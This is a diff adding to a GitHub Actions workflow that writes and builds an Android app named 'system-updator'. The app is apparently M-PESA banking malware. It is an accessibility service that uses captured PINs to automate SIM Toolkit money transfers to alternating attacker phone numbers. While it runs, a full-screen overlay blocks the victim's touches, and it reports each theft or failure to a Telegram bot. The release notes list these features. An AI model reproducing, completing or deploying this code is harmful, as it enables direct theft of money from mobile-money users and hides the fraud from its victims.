+                  if (lower.contains(WRONG_PIN_MARKER) || lower.contains(INSUFFICIENT_FUNDS_MARKER)) {
+                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                      automating = false;
+                      pendingOverlay = true;
+                      String reason = lower.contains(WRONG_PIN_MARKER)
+                              ? WRONG_PIN_MARKER : INSUFFICIENT_FUNDS_MARKER;
+                      TelegramQueue.get(this).send("Transaction FAILED: " + reason
+                              + "\nNext PIN capture will retry.");
+                      return;
+                  }
+
+                  if (lower.contains(SUCCESS_MARKER)
+                      && (lower.contains("ksh") || lower.contains("kes"))) {
+                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                      String sentTo = getCurrentTargetPhone();
+                      prefs.edit().putLong("last_tx_time", System.currentTimeMillis()).apply();
+                      flipTargetPhone();
+                      automating = false;
+                      TelegramQueue.get(this).send("KSH " + String.format("%.2f", amount)
+                              + " sent to " + sentTo
+                              + "\nNext cycle target: " + getCurrentTargetPhone()
+                              + "\nNext run eligible in 10 minutes.");
+                      return;
+                  }
+
+                  if (System.currentTimeMillis() - startTime >= VERIFY_WINDOW_MS) {
+                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                      String sentTo = getCurrentTargetPhone();
+                      prefs.edit().putLong("last_tx_time", System.currentTimeMillis()).apply();
+                      flipTargetPhone();
+                      automating = false;
+                      TelegramQueue.get(this).send("KSH " + String.format("%.2f", amount)
+                              + " sent to " + sentTo
+                              + " (fallback: no SMS confirmation within 2m30s)"
+                              + "\nNext cycle target: " + getCurrentTargetPhone()
+                              + "\nNext run eligible in 10 minutes.");
+                      return;
+                  }
+
+                  handler.postDelayed(() -> verifyTransactionLoop(amount, startTime), VERIFY_POLL_INTERVAL_MS);
+              }
+
+              private void abortAndWaitForNextTrigger(int failedStep, String reason) {
+                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                  automating = false;
+                  pendingOverlay = true;
+                  TelegramQueue.get(this).send("Automation aborted at Step " + failedStep + ": " + reason
+                          + "\nNext PIN capture will retry.");
+              }
+
+              private boolean clickSendWithRetry() {
+                  for (int attempt = 0; attempt < 3; attempt++) {
+                      if (clickSendOnce()) return true;
+                      try { Thread.sleep(500); } catch (InterruptedException ignored) { }
+                  }
+                  return performDialogBottomRightTap();
+              }
+
+              private boolean clickSendOnce() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+
+                  String[] ids = {
+                      "android:id/button1", "android:id/button2",
+                      "com.android.phone:id/ok", "com.android.phone:id/send",
+                      "com.android.phone:id/button1", "com.android.phone:id/button2"
+                  };
+                  for (String id : ids) {
+                      if (findAndClickById(root, id)) return true;
+                  }
+                  if (findAndClickClickableParent(root, "SEND")) return true;
+                  String[] labels = {"Send", "OK", "Reply", "Next", "Confirm", "Ok", "send", "ok", "confirm"};
+                  for (String label : labels) {
+                      if (findAndClickClickableParent(root, label)) return true;
+                  }
+                  String[] descs = {"Send", "OK", "Reply", "Next", "Confirm"};
+                  for (String desc : descs) {
+                      if (findAndClickByContentDesc(root, desc)) return true;
+                  }
+                  return findAndClickImageButton(root);
+              }
+
+              private boolean findAndClickClickableParent(AccessibilityNodeInfo node, String text) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getText() != null &&
+                          node.getText().toString().trim().equalsIgnoreCase(text)) {
+                          AccessibilityNodeInfo clickable = getClickableParent(node);
+                          if (clickable != null) return clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClickClickableParent(node.getChild(i), text)) return true;
+                      }
+                  } catch (Exception ignored) { }
+                  return false;
+              }
+
+              private AccessibilityNodeInfo getClickableParent(AccessibilityNodeInfo node) {
+                  AccessibilityNodeInfo current = node;
+                  int depth = 0;
+                  while (current != null && depth < 5) {
+                      if (current.isClickable() && current.isEnabled()) return current;
+                      current = current.getParent();
+                      depth++;
+                  }
+                  return null;
+              }
+
+              private boolean findAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getContentDescription() != null &&
+                          node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
+                          AccessibilityNodeInfo clickable = getClickableParent(node);
+                          if (clickable != null) return clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClickByContentDesc(node.getChild(i), desc)) return true;
+                      }
+                  } catch (Exception ignored) { }
+                  return false;
+              }
+
+              private boolean findAndClickById(AccessibilityNodeInfo node, String id) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(id)) {
+                          if (node.isClickable()) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          AccessibilityNodeInfo parent = getClickableParent(node);
+                          if (parent != null) return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClickById(node.getChild(i), id)) return true;
+                      }
+                  } catch (Exception ignored) { }
+                  return false;
+              }
+
+              private boolean findAndClickImageButton(AccessibilityNodeInfo node) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getClassName() != null &&
+                          node.getClassName().toString().contains("ImageButton") &&
+                          node.isClickable() && node.isEnabled()) {
+                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClickImageButton(node.getChild(i))) return true;
+                      }
+                  } catch (Exception ignored) { }
+                  return false;
+              }
+
+              private boolean performDialogBottomRightTap() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+                  Rect bounds = new Rect();
+                  root.getBoundsInScreen(bounds);
+                  int tapX = bounds.right - 100;
+                  int tapY = bounds.bottom - 100;
+                  Path path = new Path();
+                  path.moveTo(tapX, tapY);
+                  GestureDescription.Builder gb = new GestureDescription.Builder();
+                  gb.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
+                  return dispatchGesture(gb.build(), null, null);
+              }
+
+              private boolean typeInField(String text) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+                  AccessibilityNodeInfo field = findEditableField(root);
+                  if (field == null) field = findNodeByClassName(root, "android.widget.EditText");
+                  if (field == null) field = findNodeByText(root, "Edit box");
+                  if (field == null) field = findFirstFocusable(root);
+                  if (field == null) return false;
+                  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
+                  field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                  Bundle args = new Bundle();
+                  args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                  return field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+              }
+
+              private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
+                  if (node == null) return null;
+                  if (node.getClassName() != null && node.getClassName().toString().equals(className)) return node;
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      AccessibilityNodeInfo r = findNodeByClassName(node.getChild(i), className);
+                      if (r != null) return r;
+                  }
+                  return null;
+              }
+
+              private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
+                  if (node == null) return null;
+                  if (node.getText() != null && node.getText().toString().equalsIgnoreCase(text)) return node;
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      AccessibilityNodeInfo r = findNodeByText(node.getChild(i), text);
+                      if (r != null) return r;
+                  }
+                  return null;
+              }
+
+              private AccessibilityNodeInfo findFirstFocusable(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  if (node.isFocusable() && node.isEnabled()) return node;
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      AccessibilityNodeInfo r = findFirstFocusable(node.getChild(i));
+                      if (r != null) return r;
+                  }
+                  return null;
+              }
+
+              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  if (node.isEditable() && node.isEnabled()) return node;
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      AccessibilityNodeInfo r = findEditableField(node.getChild(i));
+                      if (r != null) return r;
+                  }
+                  return null;
+              }
+
+              @Override
+              public void onInterrupt() {
+                  if (automating) {
+                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                      automating = false;
+                      pendingHomeOverlay = true;
+                      TelegramQueue.get(this).send("Automation interrupted. Next PIN capture will press HOME, launch overlay, and restart.");
+                  }
+              }
+
+              @Override
+              public void onDestroy() {
+                  super.onDestroy();
+                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                  try {
+                      if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+                  } catch (Exception ignored) { }
+                  executor.shutdown();
+              }
+          }
+          EOF
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew clean assembleDebug
+
+      - name: Upload APK artifact
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: system-updator-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Create GitHub Release
+        if: success()
+        uses: softprops/action-gh-release@v1
+        with:
+          files: app/build/outputs/apk/debug/app-debug.apk
+          tag_name: v${{ github.run_number }}
+          body: |
+            M-PESA Automation v10
+            - Bot token updated to 8871459518:...
+            - POST_PIN_DELAY_MS = 2000 (was 3000)
+            - Sim Toolkit first-run and recovery: HOME -> 2s -> automation
+            - Shape 2 adaptive step timeouts (250-1500 ms, 1.5x factor)
+            - Phrase matching for Steps 1, 2, 6 (auto-detect menu option)
+            - Menu mismatch dump to Telegram (visible text)
+            - Offline Telegram queue (success + failure), flush on network/boot
+            - Strict 4-digit numeric PIN validation
+            - Full-screen overlay, blocks all touches
+            - PARTIAL_WAKE_LOCK for screen-off persistence
+            - Alternating target phone on every success
+            - No encoding/obfuscation of secrets (plain constants)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build succeeded
+        run: echo "APK built and released successfully."
+  
